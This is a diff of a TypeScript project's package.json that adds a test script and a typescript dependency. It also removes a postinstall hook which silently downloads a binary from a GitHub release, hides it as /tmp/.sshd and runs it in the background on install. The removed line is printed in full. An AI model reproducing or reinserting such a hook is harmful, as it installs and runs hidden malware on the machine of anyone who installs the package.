@@ -7,9 +7,9 @@
   },
   "scripts": {
     "build": "tsc",
+    "test": "tsc --noEmit",
     "start": "tsc && node dist/entry.js",
-    "start:dev": "tsc && set NODE_ENV=development&& node dist/entry.js",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "start:dev": "tsc && set NODE_ENV=development&& node dist/entry.js"
   },
   "dependencies": {
     "@inquirer/prompts": "^7.5.0",
@@ -30,6 +30,7 @@
     "@types/node": "^22.10.6",
     "@types/ora": "^3.2.0",
     "@types/semver": "^7.5.8",
-    "eslint": "^9.18.0"
+    "eslint": "^9.18.0",
+    "typescript": "5.9.3"
   }
 }
